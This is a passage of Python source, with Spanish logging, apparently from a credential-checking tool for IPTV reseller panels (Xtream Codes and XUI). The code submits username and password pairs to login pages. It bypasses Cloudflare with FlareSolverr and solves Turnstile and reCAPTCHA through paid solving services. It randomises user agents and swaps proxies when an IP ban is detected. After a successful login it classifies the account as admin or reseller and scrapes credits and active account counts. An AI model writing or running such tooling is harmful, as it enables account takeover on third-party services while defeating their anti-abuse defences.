            r'cf-turnstile.*?data-sitekey="([^"]+)"',
        ]

        for pattern in turnstile_patterns:
            match = re.search(pattern, html_content, re.IGNORECASE | re.DOTALL)
            if match:
                sitekey = match.group(1)
                self.log(f"🛡️ Cloudflare Turnstile detectado con sitekey: {sitekey}", Fore.YELLOW)
                print(f"{Fore.YELLOW}🛡️ Cloudflare Turnstile detectado con sitekey: {sitekey}{Style.RESET_ALL}")
                return sitekey

        if 'challenges.cloudflare.com/turnstile' in html_content or 'cf-turnstile' in html_content:
            self.log("🛡️ Cloudflare Turnstile detectado pero no se pudo extraer sitekey", Fore.YELLOW)
            print(f"{Fore.YELLOW}🛡️ Cloudflare Turnstile detectado pero no se pudo extraer sitekey{Style.RESET_ALL}")
            return True

        return None

    def solve_turnstile(self, sitekey, page_url):
        """Resuelve Cloudflare Turnstile usando 2captcha"""

        if not self.solver:
            print(f"{Fore.RED}❌ 2captcha no está disponible para resolver Turnstile{Style.RESET_ALL}")
            self.log("❌ 2captcha no está disponible para resolver Turnstile", Fore.RED)
            return None

        try:
            print(f"{Fore.CYAN}🛡️ Resolviendo Cloudflare Turnstile con 2captcha...{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}⏳ Esto puede tomar 30-60 segundos...{Style.RESET_ALL}")
            self.log("🛡️ Resolviendo Cloudflare Turnstile con 2captcha...", Fore.CYAN)
            self.log("⏳ Esto puede tomar 30-60 segundos...", Fore.YELLOW)

            result = self.solver.turnstile(
                sitekey=sitekey,
                url=page_url
            )

            if result and 'code' in result:
                print(f"{Fore.GREEN}✅ Turnstile resuelto exitosamente con 2captcha{Style.RESET_ALL}")
                self.log("✅ Turnstile resuelto exitosamente con 2captcha", Fore.GREEN)
                return result['code']
            else:
                print(f"{Fore.RED}❌ Error resolviendo Turnstile con 2captcha: {result}{Style.RESET_ALL}")
                self.log(f"❌ Error resolviendo Turnstile con 2captcha: {result}", Fore.RED)
                return None

        except Exception as e:
            print(f"{Fore.RED}❌ Error con Turnstile: {str(e)}{Style.RESET_ALL}")
            self.log(f"❌ Error con Turnstile: {str(e)}", Fore.RED)
            return None

    def check_captcha_balance(self):
        """Verifica el balance disponible en Captchaai y 2captcha"""
        captchaai_ok = False
        twocaptcha_ok = False

        if self.captchaai_solver:
            try:
                balance = self.captchaai_solver.balance()
                self.log(f"💰 Balance Captchaai: ${balance}", Fore.CYAN)

                if float(balance) >= 0.01:
                    captchaai_ok = True
                else:
                    self.log("⚠️ Balance insuficiente en Captchaai", Fore.YELLOW)
            except Exception as e:
                self.log(f"⚠️ No se pudo verificar balance de Captchaai: {str(e)}", Fore.YELLOW)

        if self.solver:
            try:
                balance = self.solver.balance()
                self.log(f"💰 Balance 2captcha: ${balance}", Fore.CYAN)

                if float(balance) >= 0.01:
                    twocaptcha_ok = True
                else:
                    self.log("⚠️ Balance insuficiente en 2captcha", Fore.YELLOW)
            except Exception as e:
                self.log(f"⚠️ No se pudo verificar balance de 2captcha: {str(e)}", Fore.YELLOW)

        if captchaai_ok or twocaptcha_ok:
            return True

        if not self.captchaai_solver and not self.solver:
            return True  

        self.log("❌ Balance insuficiente en todos los servicios de captcha", Fore.RED)
        return False

    @staticmethod
    def validate_and_fix_url_static(url):
        """Método estático para validar URL antes de inicializar la clase"""
        try:
            if not url.startswith(('http://', 'https://')):
                if url.startswith('ttp://'):
                    url = 'h' + url
                elif url.startswith('ttps://'):
                    url = 'h' + url
                elif not url.startswith(('/', 'www.')):
                    url = 'http://' + url

            if not url.endswith(('.php', '.html', '/')):

                parsed = urlparse(url)
                if not parsed.path or parsed.path == '/':

                    domain = parsed.netloc
                    config = get_server_config(url)
                    login_endpoint = config.get('login_endpoint', '/login.php')
                    url = url.rstrip('/') + login_endpoint

            return url
        except Exception as e:
            return url

    def get_headers(self, json_request=False):
        parsed = urlparse(self.base_url)
        is_https = parsed.scheme == 'https'

        headers = {
            "User-Agent": self.ua.random,
            "Pragma": "no-cache",
            "Accept": "*/*" if not json_request else "application/json, text/javascript, */*; q=0.01",
            "Host": self.host,
            "Referer": self.url,
            "Origin": self.base_url
        }

        if json_request:
            headers["X-Requested-With"] = "XMLHttpRequest"
        else:
            headers["Upgrade-Insecure-Requests"] = "1"

        if self.session.cookies:
            cookie_string = "; ".join([f"{cookie.name}={cookie.value}" for cookie in self.session.cookies])
            headers["Cookie"] = cookie_string

        if is_https:
            headers.update({
                "Sec-Fetch-Dest": "empty" if json_request else "document",
                "Sec-Fetch-Mode": "cors" if json_request else "navigate",
                "Sec-Fetch-Site": "same-origin" if json_request else "none",
                "Sec-Ch-Ua": '"Chromium";v="118", "Google Chrome";v="118"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"'
            })
            if not json_request:
                headers["Sec-Fetch-User"] = "?1"

        if json_request:
            headers["X-Requested-With"] = "XMLHttpRequest"

        return headers

    def make_request_with_retry(self, method, url, max_retries=None, **kwargs):
        """Método optimizado para servidores lentos usando proxy manager del destroyer"""
        if max_retries is None:
            max_retries = 2 if self.is_slow_server else 3

        for attempt in range(max_retries):

            proxy_dict = None
            if self.proxy_manager and self.proxy_manager.useProxies:

                if self.current_proxy:
                    proxy_dict = self.current_proxy
                    self.log(f"🔄 Reutilizando proxy persistente", Fore.CYAN)
                else:

                    proxy_dict, _ = self.proxy_manager.getProxy()
                    self.log(f"🆕 Obteniendo nuevo proxy", Fore.CYAN)

            try:
                if 'timeout' not in kwargs:

                    custom_timeout = self.server_config.get('request_timeout')
                    if custom_timeout:
                        kwargs['timeout'] = custom_timeout
                    elif self.is_slow_server:
                        base_connect = 20 + attempt * 10
                        base_read = 60 + attempt * 20
                        kwargs['timeout'] = (base_connect, base_read)
                    else:
                        kwargs['timeout'] = (10 + attempt * 5, 30 + attempt * 10)

                if 'headers' not in kwargs:
                    kwargs['headers'] = self.get_headers()

                if proxy_dict and 'proxies' not in kwargs:
                    kwargs['proxies'] = proxy_dict

                self.log(f"🔄 Intento {attempt + 1}/{max_retries} - {method.upper()} {url}", Fore.CYAN)

                if method.upper() == 'GET':
                    response = self.session.get(url, **kwargs)
                elif method.upper() == 'POST':
                    response = self.session.post(url, **kwargs)
                else:
                    response = self.session.request(method, url, **kwargs)

                self.log(f"✅ Request exitoso: {response.status_code}", Fore.GREEN)

                if proxy_dict and self.proxy_manager and not self.current_proxy:
                    self.current_proxy = proxy_dict
                    self.log(f"💾 Proxy guardado como persistente para esta sesión", Fore.GREEN)

                if proxy_dict and self.proxy_manager:
                    self.proxy_manager.recycle_proxy(proxy_dict)

                return response

            except (requests.exceptions.Timeout, requests.exceptions.ReadTimeout) as e:
                self.log(f"⏰ Timeout en intento {attempt + 1}: {str(e)}", Fore.YELLOW)
                if proxy_dict and self.proxy_manager:
                    self.proxy_manager.recycle_proxy(proxy_dict)
                if attempt < max_retries - 1:
                    wait_time = (3 ** attempt) if self.is_slow_server else (2 ** attempt)
                    self.log(f"⏳ Esperando {wait_time}s antes del siguiente intento...", Fore.YELLOW)
                    time.sleep(wait_time)
                    continue
                else:
                    self.log(f"❌ Timeout final después de {max_retries} intentos", Fore.RED)
                    return None

            except requests.exceptions.ProxyError as e:
                self.log(f"🔌 Error de proxy en intento {attempt + 1}: {str(e)}", Fore.YELLOW)
                if proxy_dict and self.proxy_manager:
                    self.proxy_manager.eliminateProxy(proxy_dict)

                    if self.current_proxy == proxy_dict:
                        self.current_proxy = None
                        self.log(f"🗑️ Proxy persistente eliminado, se obtendrá uno nuevo", Fore.YELLOW)
                if attempt < max_retries - 1:
                    continue
                else:
                    return None

            except requests.exceptions.ConnectionError as e:
                self.log(f"🔗 Error de conexión en intento {attempt + 1}: {str(e)}", Fore.YELLOW)
                if proxy_dict and self.proxy_manager:
                    self.proxy_manager.eliminateProxy(proxy_dict)

                    if self.current_proxy == proxy_dict:
                        self.current_proxy = None
                        self.log(f"🗑️ Proxy persistente eliminado, se obtendrá uno nuevo", Fore.YELLOW)
                if attempt < max_retries - 1:
                    wait_time = (8 + attempt * 5) if self.is_slow_server else (5 + attempt * 3)
                    self.log(f"⏳ Esperando {wait_time}s por problema de conexión...", Fore.YELLOW)
                    time.sleep(wait_time)
                    continue
                else:
                    return None

            except Exception as e:
                self.log(f"❌ Error inesperado en intento {attempt + 1}: {str(e)}", Fore.RED)
                if proxy_dict and self.proxy_manager:
                    self.proxy_manager.recycle_proxy(proxy_dict)
                if attempt < max_retries - 1:
                    time.sleep(3 if self.is_slow_server else 2)
                    continue
                else:
                    return None

        return None

    def login(self):
        try:
            self.log(f"🔑 Iniciando proceso de login en {self.url} con usuario {self.username}", Fore.CYAN)

            initial_response = None
            cloudflare_detected = False

            force_flaresolverr = self.server_config.get('force_flaresolverr', False)

            if force_flaresolverr and self.flaresolverr_handler and self.flaresolverr_handler.available:
                self.log("🛡️ Servidor requiere FlareSolverr - usando directamente con sesión persistente", Fore.CYAN)

                if not self.flaresolverr_handler.session_id:
                    self.log("🔄 Creando sesión persistente de FlareSolverr para panel SPA...", Fore.CYAN)
                    if self.flaresolverr_handler.create_session():
                        self.log("✅ Sesión persistente creada - todas las requests usarán esta sesión", Fore.GREEN)
                    else:
                        self.log("⚠️ No se pudo crear sesión persistente - continuando sin ella", Fore.YELLOW)

                self.log("🚀 Obteniendo página de login con FlareSolverr + sesión persistente...", Fore.CYAN)
                flare_solution = self.cloudflare_detector.solve_with_flaresolverr(self.url)

                if flare_solution and flare_solution.get('success'):

                    if self.flaresolverr_handler.apply_solution_to_session(self.session, flare_solution):
                        self.log("✅ Acceso obtenido con FlareSolverr - cookies y UA aplicados", Fore.GREEN)
                        self.flaresolverr_solution = flare_solution
                        self.flaresolverr_user_agent = flare_solution.get('user_agent')
                        self.is_cloudflare_protected = True

                        class FakeResponse:
                            def __init__(self, text, status_code, url):
                                self.text = text
                                self.status_code = status_code
                                self.url = url
                                self.content = text.encode('utf-8')

                        initial_response = FakeResponse(
                            flare_solution['html'],
                            flare_solution['status_code'],
                            self.url
                        )
                        cloudflare_detected = True
                    else:
                        self.log("❌ No se pudo aplicar la solución de FlareSolverr", Fore.RED)
                        return False
                else:
                    self.log("❌ FlareSolverr no pudo resolver la protección de Cloudflare", Fore.RED)
                    return False

            elif not initial_response:
                self.log("📥 Obteniendo página de login con método tradicional...", Fore.CYAN)
                initial_response = self.make_request_with_retry('GET', self.url, max_retries=3)

                if initial_response:
                    if initial_response.status_code in [403, 503, 429, 521, 522, 523, 524, 525, 526]:
                        self.log(f"🛡️ Código {initial_response.status_code} detectado - posible Cloudflare", Fore.YELLOW)
                        cloudflare_detected = True
                    elif self.cloudflare_detector._detect_cloudflare_in_response(initial_response):
                        cloudflare_detected = True

            if (not initial_response or cloudflare_detected) and not self.flaresolverr_solution:
                if not initial_response:
                    self.log("⚠️ No se pudo obtener respuesta - intentando con FlareSolverr", Fore.YELLOW)
                else:
                    self.log("🛡️ Cloudflare detectado - intentando resolver con FlareSolverr", Fore.YELLOW)

                if self.flaresolverr_handler and self.flaresolverr_handler.available:
                    flare_solution = self.cloudflare_detector.solve_with_flaresolverr(self.url)

                    if flare_solution and flare_solution.get('success'):

                        if self.flaresolverr_handler.apply_solution_to_session(self.session, flare_solution):
                            self.log("✅ Cloudflare resuelto - cookies y UA aplicados a la sesión", Fore.GREEN)
                            self.flaresolverr_solution = flare_solution

                            class FakeResponse:
                                def __init__(self, text, status_code, url):
                                    self.text = text
                                    self.status_code = status_code
                                    self.url = url
                                    self.content = text.encode('utf-8')

                            initial_response = FakeResponse(
                                flare_solution['html'],
                                flare_solution['status_code'],
                                self.url
                            )
                        else:
                            self.log("⚠️ No se pudo aplicar la solución de FlareSolverr", Fore.YELLOW)
                    else:
                        self.log("❌ FlareSolverr no pudo resolver", Fore.RED)
                        return False
                else:
                    self.log("❌ FlareSolverr no disponible y no se puede acceder al panel", Fore.RED)
                    return False

            if not initial_response:
                self.log("❌ No se pudo obtener la página de login después de intentar con FlareSolverr", Fore.RED)
                return False

            if initial_response.status_code not in [200, 302]:
                self.log(f"⚠️ Código de respuesta inusual: {initial_response.status_code}", Fore.YELLOW)

            self.log("✅ Página de login obtenida correctamente", Fore.GREEN)

            turnstile_sitekey = self.detect_turnstile(initial_response.text)
            captcha_response = None
            captcha_type = None

            if turnstile_sitekey and isinstance(turnstile_sitekey, str):
                captcha_response = self.solve_turnstile(turnstile_sitekey, self.url)
                captcha_type = 'turnstile'

                if not captcha_response:
                    print(f"{Fore.RED}❌ No se pudo resolver Cloudflare Turnstile - marcando como RETRY{Style.RESET_ALL}")
                    self.log("❌ No se pudo resolver Cloudflare Turnstile - marcando como RETRY", Fore.RED)
                    return None
            else:

                captcha_sitekey = self.detect_recaptcha(initial_response.text)

                if captcha_sitekey and isinstance(captcha_sitekey, str):
                    captcha_response = self.solve_recaptcha(captcha_sitekey, self.url)
                    captcha_type = 'recaptcha'

                    if not captcha_response:
                        print(f"{Fore.RED}❌ No se pudo resolver el reCAPTCHA - marcando como RETRY{Style.RESET_ALL}")
                        self.log("❌ No se pudo resolver el reCAPTCHA - marcando como RETRY", Fore.RED)
                        return None
                elif captcha_sitekey is True:
                    soup = BeautifulSoup(initial_response.text, 'html.parser')
                    captcha_div = soup.find('div', class_='g-recaptcha')
                    if captcha_div and captcha_div.get('data-sitekey'):
                        sitekey = captcha_div.get('data-sitekey')
                        captcha_response = self.solve_recaptcha(sitekey, self.url)
                        captcha_type = 'recaptcha'

                        if not captcha_response:
                            print(f"{Fore.RED}❌ No se pudo resolver el reCAPTCHA - marcando como RETRY{Style.RESET_ALL}")
                            self.log("❌ No se pudo resolver el reCAPTCHA - marcando como RETRY", Fore.RED)
                            return None

            login_data = {
                'referrer': '',
                'username': self.username,
                'password': self.password,
                'login': ''
            }

            if captcha_response:
                if captcha_type == 'turnstile':
                    login_data['cf-turnstile-response'] = captcha_response
                    self.log("✅ Turnstile agregado al formulario de login", Fore.GREEN)
                elif captcha_type == 'recaptcha':
                    login_data['g-recaptcha-response'] = captcha_response
                    self.log("✅ reCAPTCHA agregado al formulario de login", Fore.GREEN)
            else:
                self.log("ℹ️ No se detectó captcha, continuando sin captcha", Fore.CYAN)

            soup = BeautifulSoup(initial_response.text, 'html.parser')
            form = soup.find('form')
            if form:
                inputs = form.find_all('input')
                for input_field in inputs:
                    name = input_field.get('name')
                    input_type = input_field.get('type', 'text')
                    value = input_field.get('value', '')

                    if name and input_type == 'hidden':
                        login_data[name] = value
                        self.log(f"🔍 Campo oculto encontrado: {name} = {value}", Fore.CYAN)

            self.log(f"📋 Datos de login preparados: {list(login_data.keys())}", Fore.CYAN)

            self.log("🚀 Enviando datos de login...", Fore.CYAN)

            if self.flaresolverr_solution and self.flaresolverr_handler and self.flaresolverr_handler.available:
                self.log("🔧 Usando FlareSolverr para enviar el POST de login...", Fore.CYAN)

                post_result = self.flaresolverr_handler.solve_cloudflare_post(self.url, login_data)

                if post_result and post_result.get('success'):
                    self.log(f"✅ POST enviado con FlareSolverr - Status: {post_result['status_code']}", Fore.GREEN)

                    for cookie in post_result.get('cookies', []):
                        self.session.cookies.set(cookie['name'], cookie['value'])
                    self.log(f"🍪 Cookies actualizadas: {len(post_result.get('cookies', []))} cookies de FlareSolverr", Fore.CYAN)

                    class FakeResponse:
                        def __init__(self, text, status_code, url):
                            self.text = text
                            self.status_code = status_code
                            self.url = url
                            self.content = text.encode('utf-8')

                    response = FakeResponse(
                        post_result['html'],
                        post_result['status_code'],
                        post_result.get('url', self.url)
                    )
                else:
                    self.log("⚠️ FlareSolverr POST falló - intentando con método normal", Fore.YELLOW)
                    response = self.make_request_with_retry(
                        'POST',
                        self.url,
                        max_retries=3,
                        data=login_data,
                        allow_redirects=True
                    )
            else:

                response = self.make_request_with_retry(
                    'POST',
                    self.url,
                    max_retries=3,
                    data=login_data,
                    allow_redirects=True
                )

            if response is None:
                self.log("❌ No se pudo realizar el login después de varios intentos", Fore.RED)
                return False

            self.log(f"📊 Respuesta del login: {response.status_code}", Fore.CYAN)
            self.log(f"🌐 URL final: {response.url}", Fore.CYAN)

            login_check = self.check_login_success(response)

            if login_check is None:

                self.log(f"🚫 Baneo de IP detectado - se requiere cambiar IP", Fore.YELLOW)
                return None  
            elif login_check == False:
                self.log(f"❌ Login fallido con {self.username}", Fore.RED)
                return False

            if 'login.php' in response.url:
                self.log("🔍 Login exitoso pero URL en login.php, obteniendo página principal...", Fore.CYAN)

                for test_page in ['reseller.php', 'users.php']:
                    test_url = f"{self.base_url}/{test_page}"

                    test_response = self.make_request_with_retry('GET', test_url, timeout=(10, 20), max_retries=2, verify=False, allow_redirects=True)

                    if test_response and 'login.php' not in test_response.url:
                        self.log(f"✅ Acceso a {test_page}: {test_response.url}", Fore.GREEN)
                        response = test_response  
                        break

            if response.url != self.url:
                self.base_url = '/'.join(response.url.split('/')[:-1])

            content_lower = response.text.lower()

            if 'reseller.php' in response.url:
                self.panel_type = 'XC'
                self.log("🔍 Panel XC detectado (reseller.php)", Fore.CYAN)
            elif 'dashboard.php' in response.url:
                self.panel_type = 'XC'
                self.admin = "SI"
                self.log("🔍 Panel XC detectado (dashboard.php) - ADMIN", Fore.GREEN)
            elif 'users.php' in response.url:
                self.panel_type = 'XC'
                self.log("🔍 Panel XC detectado (users.php)", Fore.CYAN)
            elif '/lines' in response.url or '/session' in response.url:
                self.panel_type = 'XUI'
                self.log("🔍 Panel XUI detectado por URL", Fore.CYAN)
            else:

                xc_indicators = [
                    'xtream', 'reseller', 'users.php', 'table_search.php',
                    'admin & reseller interface', 'xtream codes'
                ]
                xui_indicators = [
                    'xui', 'x-ui', '"lines"', 'inbounds', 'session'
                ]

                xc_count = sum(1 for indicator in xc_indicators if indicator in content_lower)
                xui_count = sum(1 for indicator in xui_indicators if indicator in content_lower)

                if xc_count > xui_count:
                    self.panel_type = 'XC'
                    self.log(f"🔍 Panel XC detectado por contenido (score: XC={xc_count}, XUI={xui_count})", Fore.CYAN)
                else:
                    self.panel_type = 'XUI'
                    self.log(f"🔍 Panel XUI detectado por contenido (score: XUI={xui_count}, XC={xc_count})", Fore.CYAN)

            if self.panel_type == 'XC':
                if 'dashboard.php' in response.url:
                    self.admin = "SI"
                    self.log("🔰 Cuenta ADMIN XC detectada (URL: dashboard.php - Owner)", Fore.GREEN)
                elif 'reseller.php' in response.url:
                    self.admin = "NO"
                    self.log("👤 Cuenta RESELLER XC detectada (URL: reseller.php - Sub-cuenta)", Fore.YELLOW)
                else:

                    content_lower = response.text.lower()
                    html_content = response.text

                    strict_admin_indicators = [
                        ('streams.php' in content_lower and 'href=' in content_lower),  
                        ('servers.php' in content_lower and 'href=' in content_lower),  
                        'id="servers"' in html_content,  
                        'id="streaming"' in html_content,  
                        ('administrator panel' in content_lower),  
                        ('admin.php' in content_lower and 'href=' in content_lower)  
                    ]

                    if any(strict_admin_indicators):
                        self.admin = "SI"
                        self.log("🔰 Cuenta ADMIN XC detectada (elementos de configuración de sistema)", Fore.GREEN)
                    else:
                        self.admin = "NO"
                        self.log("👤 Cuenta RESELLER por defecto (sin elementos de admin)", Fore.YELLOW)

            elif self.panel_type == 'XUI':

                    xui_admin_indicators = [
                        'add reseller', 'reseller', 'administrator',
                        'system settings', 'manage users', 'server settings',
                        'admin panel', 'panel settings', 'resellers',
                        'add user', 'user management'
                    ]

                    for indicator in xui_admin_indicators:
                        if indicator in content_lower:
                            self.admin = "SI"
                            self.log(f"🔰 Cuenta ADMIN XUI detectada (por contenido: '{indicator}')", Fore.GREEN)
                            break

            self.log(f"✅ Panel tipo: {self.panel_type}, Base URL: {self.base_url}, Admin: {self.admin}", Fore.GREEN)

            self.get_reseller_info_fast()

            return True

        except Exception as e:
            self.log(f"❌ Error durante el login con {self.username}: {str(e)}", Fore.RED)
            return False

        finally:

            self._cleanup_flaresolverr_session()

    def _verify_auth_with_api(self):
        """Verifica autenticación usando endpoint API (para paneles SPA modernos)"""
        try:

            test_urls = [
                f"{self.base_url}/api.php?action=reseller_dashboard",
                f"{self.base_url}/api.php?action=admin_dashboard",
                f"{self.base_url}/api?action=dashboard"
            ]

            for url in test_urls:
                try:

                    if self.flaresolverr_handler and self.flaresolverr_handler.session_id:
                        self.log(f"🔍 Verificando API con sesión FlareSolverr: {url}", Fore.CYAN)

                        api_solution = self.flaresolverr_handler.solve_cloudflare(url)
                        if api_solution and api_solution.get('success'):
                            response_text = api_solution.get('html', '')

                            class FakeAPIResponse:
                                def __init__(self, text):
                                    self.text = text
                                    self.status_code = 200
                                def json(self):
                                    import json as json_module
                                    return json_module.loads(self.text)
                            response = FakeAPIResponse(response_text)
                        else:
                            continue

                    elif self.flaresolverr_handler and self.flaresolverr_handler.available and self.flaresolverr_solution:
                        headers = self.get_headers(json_request=True)
                        response = self.session.get(url, headers=headers, timeout=10, verify=False)
                    else:
                        headers = self.get_headers(json_request=True)
                        response = self.session.get(url, headers=headers, timeout=10, verify=False)

                    if response.status_code == 200:
                        try:
                            data = response.json()
                            self.log(f"📦 API Response: {str(data)[:200]}", Fore.CYAN)

                            if isinstance(data, dict) and len(data) > 0:

                                if any(key in data for key in ['credits', 'accounts', 'lines', 'users', 'active_accounts', 'open_connections', 'online_users']):
                                    self.log(f"✅ Autenticación verificada con API: {url}", Fore.GREEN)
                                    self.log(f"📊 Datos dashboard: {data}", Fore.GREEN)
                                    return True
                                else:
                                    self.log(f"⚠️ JSON sin campos esperados: {list(data.keys())}", Fore.YELLOW)
                        except Exception as e:
                            self.log(f"⚠️ Error parseando JSON: {str(e)} - Response: {response.text[:200]}", Fore.YELLOW)
                except Exception as e:
                    self.log(f"⚠️ Error en request API: {str(e)}", Fore.YELLOW)
                    continue

            return False
        except:
            return False

    def _cleanup_flaresolverr_session(self):
        """Limpia la sesión persistente de FlareSolverr si existe"""
        try:
            if self.flaresolverr_handler and self.flaresolverr_handler.session_id:
                self.log("🧹 Limpiando sesión de FlareSolverr...", Fore.CYAN)
                self.flaresolverr_handler.destroy_session()
        except Exception as e:
            if self.verbose:
                self.log(f"⚠️ Error limpiando sesión FlareSolverr: {str(e)}", Fore.YELLOW)

    def check_login_success(self, response):
        """Verifica si el login fue exitoso analizando la respuesta - VERSIÓN CORREGIDA"""
        try:
            self.log("🔍 Analizando respuesta de login...", Fore.CYAN)
            self.log(f"📍 URL actual: {response.url}", Fore.CYAN)
            self.log(f"📏 Tamaño respuesta: {len(response.text)} caracteres", Fore.CYAN)

            if 'login.php' not in response.url and response.url != self.url:
                self.log(f"✅ Login exitoso - redirigido fuera de login: {response.url}", Fore.GREEN)
                return True

            success_urls = ['reseller.php', 'dashboard.php', 'admin.php', 'panel.php', 'users.php', 'lines']
            for success_url in success_urls:
                if success_url in response.url:
                    self.log(f"✅ Login exitoso detectado por URL: {response.url}", Fore.GREEN)
                    return True

            content_lower = response.text.lower()

            ban_indicators = [
                "too many times", "try again tomorrow", "please wait",
                "temporarily blocked", "please try again later",
                "incorrectly entered a username and password too many times",
                "demasiados intentos", "intente mañana",
                "bloqueado temporalmente", "espere antes de intentar"
            ]

            for ban_indicator in ban_indicators:
                if ban_indicator in content_lower:
                    self.log(f"🚫 BANEO DE IP DETECTADO: {ban_indicator}", Fore.YELLOW)
                    self.log(f"⚠️ La IP está temporalmente bloqueada. Cambia de IP/proxy.", Fore.YELLOW)

                    return None

            error_indicators = [
                'invalid username', 'invalid password', 'login failed',
                'incorrect credentials', 'authentication failed', 'captcha failed',
                'wrong username', 'wrong password', 'access denied',
                'usuario o contraseña incorrectos', 'credenciales incorrectas',
                'error de autenticación', 'login incorrecto', 'acceso denegado',
                'bad login', 'authentication error', 'login error',
                'failed to login', 'invalid login', 'login unsuccessful'
            ]

            for error in error_indicators:
                if error in content_lower:
                    self.log(f"❌ Error de login detectado: {error}", Fore.RED)
                    return False

            strong_indicators = [
                'logout.php', 'dashboard.php', 'reseller.php',
                'admin.php', 'panel.php', 'users.php'
            ]

            for indicator in strong_indicators:
                if indicator in content_lower:
                    self.log(f"✅ Login exitoso - indicador fuerte: {indicator}", Fore.GREEN)
                    return True

            weak_indicators = [
                'dashboard', 'reseller', 'welcome', 'bienvenido',
                'credits', 'créditos', 'accounts', 'cuentas',
                'users', 'usuarios', 'lines', 'líneas',
                'logout', 'cerrar sesión', 'salir',
                'control panel', 'panel de control'
            ]

            weak_count = 0
            found_weak = []
            for indicator in weak_indicators:
                if indicator in content_lower:
                    weak_count += 1
                    found_weak.append(indicator)

            if weak_count >= 3:

                if (not any(error in content_lower for error in ['error', 'failed', 'invalid', 'incorrect']) and
                    len(response.text) > 1000):
                    self.log(f"✅ Login exitoso - indicadores débiles: {found_weak}", Fore.GREEN)
                    return True

            if response.url == self.url:
                if '<form' in response.text and any(field in content_lower for field in ['username', 'password', 'usuario', 'contraseña']):
                    self.log("❌ Seguimos en página de login - formulario detectado", Fore.RED)
                    return False

            if self.is_cloudflare_protected:
                self.log("🔍 Panel SPA detectado - verificando autenticación con API...", Fore.CYAN)
                if self._verify_auth_with_api():
                    self.log("✅ Login exitoso - verificado con API", Fore.GREEN)
                    return True

            self.log("❌ Login fallido - sin indicadores suficientes de éxito", Fore.RED)
            return False

        except Exception as e:
            self.log(f"❌ Error verificando login: {str(e)}", Fore.RED)
            return False

    def get_reseller_info_fast(self):
        """Obtiene información del reseller de forma rápida"""
        try:

            if self.panel_type == 'XC':
                if self.admin == "SI":

                    info_urls = [
                        f"{self.base_url}/api.php?action=admin_dashboard",
                        f"{self.base_url}/api?action=admin_dashboard",  
                        f"{self.base_url}/api.php?action=system_stats",
                        f"{self.base_url}/api.php?action=reseller_dashboard",  
                        f"{self.base_url}/api?action=dashboard"  
                    ]
                else:

                    info_urls = [
                        f"{self.base_url}/api.php?action=reseller_dashboard",
                        f"{self.base_url}/api?action=dashboard",  
                        f"{self.base_url}/api.php?action=dashboard"  
                    ]
            else:  
                info_urls = [
                    f"{self.base_url}/api?action=dashboard",
                    f"{self.base_url}/api.php?action=dashboard",  
                    f"{self.base_url}/dashboard"
                ]

            for url in info_urls:
                try:

                    if self.flaresolverr_handler and self.flaresolverr_handler.session_id:
                        if self.verbose:
                            self.log(f"🔍 Obteniendo dashboard info con sesión FlareSolverr: {url}", Fore.CYAN)

                        api_solution = self.flaresolverr_handler.solve_cloudflare(url)

                        if api_solution and api_solution.get('success'):
                            response_text = api_solution.get('html', '')
                            status_code = api_solution.get('status_code', 200)

                            if self.verbose:
                                self.log(f"📊 FlareSolverr response status: {status_code}", Fore.CYAN)
                                self.log(f"📊 Response preview: {response_text[:200]}", Fore.CYAN)

                            try:
                                import json as json_module
                                import re

                                json_text = response_text

                                if '<body>' in response_text and '</body>' in response_text:

                                    body_match = re.search(r'<body>(.*?)</body>', response_text, re.DOTALL)
                                    if body_match:
                                        json_text = body_match.group(1).strip()
                                        if self.verbose:
                                            self.log(f"🔧 JSON extraído del HTML body: {json_text[:150]}", Fore.CYAN)

                                data = json_module.loads(json_text)

                                class FakeAPIResponse:
                                    def __init__(self, text, status):
                                        self.text = text  
                                        self.status_code = status
                                    def json(self):
                                        return data

                                response = FakeAPIResponse(json_text, status_code)  

                                if status_code == 200:
                                    self.extract_reseller_info_from_response(response)

                                    has_valid_data = any([
                                        self.reseller_info.get('credits') not in ['N/A', 'N/D', ''],
                                        self.reseller_info.get('active_accounts') not in ['N/A', 'N/D', ''],
                                        self.reseller_info.get('open_connections') not in ['N/A', 'N/D', ''],
                                        self.reseller_info.get('online_users') not in ['N/A', 'N/D', '']
                                    ])

                                    if has_valid_data:
                                        if self.verbose:
                                            self.log(f"✅ Datos de dashboard obtenidos exitosamente", Fore.GREEN)
                                        break
                                else:
                                    if self.verbose:
                                        self.log(f"⚠️ Status {status_code} - intentando siguiente endpoint", Fore.YELLOW)
                                    continue

                            except json_module.JSONDecodeError as e:

                                if self.verbose:
                                    self.log(f"⚠️ No es JSON válido: {str(e)[:100]}", Fore.YELLOW)
                                continue

                    headers = self.get_headers(json_request=True)

                    response = self.make_request_with_retry(
                        'GET', url,
                        headers=headers,
                        timeout=(5, 10),
                        max_retries=2,
                        verify=False,
                        allow_redirects=True
                    )

                    if response and response.status_code == 200:

                        self.extract_reseller_info_from_response(response)

                        has_valid_data = any([
                            self.reseller_info.get('credits') not in ['N/A', 'N/D', ''],
                            self.reseller_info.get('active_accounts') not in ['N/A', 'N/D', ''],
                            self.reseller_info.get('open_connections') not in ['N/A', 'N/D', ''],
                            self.reseller_info.get('online_users') not in ['N/A', 'N/D', '']
                        ])

                        if has_valid_data:

                            break

                except Exception as e:
                    if self.verbose:
                        self.log(f"⚠️ Error obteniendo dashboard info: {str(e)}", Fore.YELLOW)
                    continue

        except Exception as e:
            pass  

    def extract_reseller_info_from_response(self, response):
        """Extrae información del reseller de la respuesta"""
        try:

            try:
                data = response.json()
                if 'active_accounts' in data:
                    self.reseller_info['active_accounts'] = str(data['active_accounts'])
                if 'credits' in data:
                    self.reseller_info['credits'] = str(data['credits'])
                if 'open_connections' in data:
                    self.reseller_info['open_connections'] = str(data['open_connections'])
                if 'online_users' in data:
                    self.reseller_info['online_users'] = str(data['online_users'])
                self.log(f"✅ Info obtenida - Créditos: {self.reseller_info['credits']}, Cuentas: {self.reseller_info['active_accounts']}, Conexiones: {self.reseller_info.get('open_connections', 'N/D')}, Online: {self.reseller_info.get('online_users', 'N/D')}", Fore.GREEN)
                return
            except:
                pass

            content = response.text.lower()

            credit_match = re.search(r'credits?[:\s]*([0-9.,]+)', content)
            if credit_match:
                self.reseller_info['credits'] = credit_match.group(1)

            accounts_match = re.search(r'active\s+(?:accounts?|lines?)[:\s]*([0-9.,]+)', content)
            if accounts_match:
                self.reseller_info['active_accounts'] = accounts_match.group(1)

